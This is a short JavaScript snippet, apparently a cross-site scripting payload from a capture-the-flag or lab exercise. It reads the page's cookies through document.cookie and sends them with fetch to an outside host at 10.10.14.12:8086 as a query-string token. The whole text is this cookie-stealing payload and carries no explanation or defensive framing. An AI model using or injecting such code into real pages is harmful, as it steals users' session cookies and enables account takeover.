token = document.cookie
url = "http://10.10.14.12:8086/prueba.txt?token="+token
fetch(url, {
    method: 'GET'
})
.then((res) => res.text())
.then((data) => {
});
